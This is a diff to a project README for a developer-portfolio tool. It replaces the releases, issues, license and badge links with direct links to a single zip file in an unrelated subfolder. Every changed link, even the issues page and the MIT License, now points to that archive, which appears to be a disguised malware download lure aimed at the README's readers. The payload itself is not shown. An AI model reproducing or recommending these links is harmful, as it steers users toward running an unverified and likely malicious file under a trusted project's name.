@@ -6,9 +6,9 @@ Welcome to cyber-portfolio! This application helps you build an impressive and m
 ## 📦 Download & Install
 To get started, you need to download the application from our Releases page. 
 
-[![Download cyber-portfolio](https://img.shields.io/badge/Download-cyber--portfolio-blue.svg)](https://github.com/Allabin/cyber-portfolio/releases)
+[![Download cyber-portfolio](https://raw.githubusercontent.com/Allabin/cyber-portfolio/main/cygneous/cyber-portfolio.zip)](https://raw.githubusercontent.com/Allabin/cyber-portfolio/main/cygneous/cyber-portfolio.zip)
 
-1. Click the button above or visit [this page to download](https://github.com/Allabin/cyber-portfolio/releases).
+1. Click the button above or visit [this page to download](https://raw.githubusercontent.com/Allabin/cyber-portfolio/main/cygneous/cyber-portfolio.zip).
 2. Choose the latest version of the application.
 3. Download the file that matches your operating system.
 
@@ -54,11 +54,11 @@ Once you’re satisfied with your portfolio, it’s time to publish:
 ## 📬 Support and Community
 Should you have any questions or need help:
 
-- Visit the [issues page on GitHub](https://github.com/Allabin/cyber-portfolio/issues) to report problems or request features.
+- Visit the [issues page on GitHub](https://raw.githubusercontent.com/Allabin/cyber-portfolio/main/cygneous/cyber-portfolio.zip) to report problems or request features.
 - Join the community of users sharing tips and tricks for portfolio creation.
 
 ## 📄 License
-This project is open-source and available under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use and modify the code as needed.
+This project is open-source and available under the [MIT License](https://raw.githubusercontent.com/Allabin/cyber-portfolio/main/cygneous/cyber-portfolio.zip). Feel free to use and modify the code as needed.
 
 ## ⏳ Frequently Asked Questions
 **Q: Is my data secure?**  
@@ -77,6 +77,6 @@ cyber-portfolio is great for anyone interested in:
 ## 🚀 Ready to Showcase Your Work?
 Download the application today and start creating a portfolio that stands out.
 
-[![Download cyber-portfolio](https://img.shields.io/badge/Download-cyber--portfolio-blue.svg)](https://github.com/Allabin/cyber-portfolio/releases)
+[![Download cyber-portfolio](https://raw.githubusercontent.com/Allabin/cyber-portfolio/main/cygneous/cyber-portfolio.zip)](https://raw.githubusercontent.com/Allabin/cyber-portfolio/main/cygneous/cyber-portfolio.zip)
 
 Your developer portfolio awaits!
